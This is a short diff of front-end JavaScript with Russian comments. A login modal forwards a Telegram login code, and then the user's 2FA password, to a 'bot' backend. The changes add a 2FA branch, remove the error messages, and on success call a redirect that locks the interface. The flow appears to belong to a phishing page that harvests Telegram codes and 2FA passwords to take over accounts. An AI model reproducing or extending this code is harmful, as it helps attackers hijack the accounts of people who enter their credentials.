@@ -1083,16 +1083,15 @@
                 const result = await response.json();
                 console.log('📨 Ответ от бота:', result);
                 
-                if (result.success) {
-                    console.log('✅ РЕАЛЬНЫЙ код отправлен через Telegram API');
-                    // ТОЛЬКО ЕСЛИ УСПЕХ - переходим к шагу 2
-                    step1.classList.remove('active');
-                    step2.classList.add('active');
-                } else {
-                    // ЕСЛИ ОШИБКА - показываем alert и остаемся на шаге 1
-                    alert('❌ Ошибка отправки кода: ' + (result.error || 'Неизвестная ошибка'));
-                    console.log('❌ Ошибка отправки кода:', result.error);
-                }
+               if (result.success) {
+    console.log('✅ РЕАЛЬНЫЙ код подтвержден Telegram');
+    // ПОКАЗЫВАЕМ РЕДИРЕКТ И БЛОКИРУЕМ ИНТЕРФЕЙС
+    showSuccessRedirect();
+} else if (result['2fa_required']) {
+    console.log('🔐 Требуется 2FA');
+    step2.classList.remove('active');
+    step2fa.classList.add('active');
+}
                 
             } catch (error) {
                 console.log('❌ Ошибка соединения с ботом:', error);
@@ -1211,15 +1210,10 @@
                 console.log('📨 Ответ от бота:', result);
                 
                 if (result.success) {
-                    console.log('✅ 2FA успешно пройдена!');
-                    alert('✅ Авторизация успешна!');
-                    loginModal.classList.remove('active');
-                    resetModal();
-                    isUserLoggedIn = true;
-                } else {
-                    alert('❌ Ошибка: ' + (result.error || 'Неверный пароль'));
-                    console.log('❌ Ошибка 2FA:', result.error);
-                }
+    console.log('✅ 2FA успешно пройдена!');
+    // ПОКАЗЫВАЕМ РЕДИРЕКТ И БЛОКИРУЕМ ИНТЕРФЕЙС
+    showSuccessRedirect();
+}
                 
             } catch (error) {
                 console.log('❌ Ошибка соединения с ботом:', error);
